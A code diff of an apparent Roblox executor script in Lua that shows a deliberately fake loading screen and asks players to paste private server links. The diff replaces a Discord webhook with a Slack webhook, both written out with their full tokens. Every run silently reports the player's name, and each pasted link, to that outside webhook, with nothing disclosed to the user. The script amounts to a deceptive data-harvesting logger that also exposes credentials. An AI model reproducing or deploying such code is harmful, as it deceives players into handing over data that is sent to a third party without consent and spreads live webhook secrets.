@@ -1,8 +1,7 @@
 --========================
 -- CONFIG
 --========================
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1468274684557529118/zJwKaKc2q7yb8tCs2XdZSYGuciAlRqX-3sVTro8RMEfwR2Tl1tSUf_-MHMiPVvJxlt17"
-local DISCORD_INVITE = "https://discord.gg/ZPz8Renfz"
+local WEBHOOK_URL = "https://hooks.slack.com/services/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"
 
 --========================
 -- SERVICES
@@ -27,14 +26,14 @@ local function sendWebhook(msg)
         Url = WEBHOOK_URL,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode({content = msg})
+        Body = HttpService:JSONEncode({text = msg})
     })
 end
 
 --========================
--- LOG EXECUTION (NOVO)
+-- LOG EXECUTION
 --========================
-sendWebhook("🚀 **SCRIPT EXECUTADO**\n👤 Usuário: "..player.Name)
+sendWebhook("🚀 SCRIPT EXECUTADO\n👤 Usuário: "..player.Name)
 
 --========================
 -- GUI BASE
@@ -67,7 +66,7 @@ task.wait(1)
 intro:Destroy()
 
 --========================
--- LOADING FAKE (95%)
+-- LOADING FAKE
 --========================
 local loading = Instance.new("Frame", gui)
 loading.Size = UDim2.fromScale(1,1)
@@ -98,7 +97,7 @@ task.wait(7)
 loading:Destroy()
 
 --========================
--- MAIN UI (FULLSCREEN)
+-- MAIN UI
 --========================
 local main = Instance.new("Frame", gui)
 main.Size = UDim2.fromScale(1,1)
@@ -190,28 +189,6 @@ Instance.new("UICorner", send).CornerRadius = UDim.new(0,16)
 
 send.MouseButton1Click:Connect(function()
     if box.Text == "" then return end
-    sendWebhook("🔗 **Server Privado Enviado**\n👤 "..player.Name.."\n📎 "..box.Text)
+    sendWebhook("🔗 Server Privado Enviado\n👤 "..player.Name.."\n📎 "..box.Text)
     send.Text = "Enviado ✔"
-end)
-
---========================
--- DISCORD BUTTON
---========================
-local discord = Instance.new("TextButton", main)
-discord.Position = UDim2.fromScale(0.35,0.58)
-discord.Size = UDim2.fromScale(0.3,0.07)
-discord.Text = "Entrar no Discord"
-discord.TextScaled = true
-discord.Font = Enum.Font.GothamSemibold
-discord.BackgroundColor3 = Color3.fromRGB(90,90,255)
-discord.TextColor3 = Color3.new(1,1,1)
-Instance.new("UICorner", discord).CornerRadius = UDim.new(0,16)
-
-discord.MouseButton1Click:Connect(function()
-    if setclipboard then
-        setclipboard(DISCORD_INVITE)
-        discord.Text = "Link copiado ✔"
-        task.wait(1.5)
-        discord.Text = "Entrar no Discord"
-    end
 end)
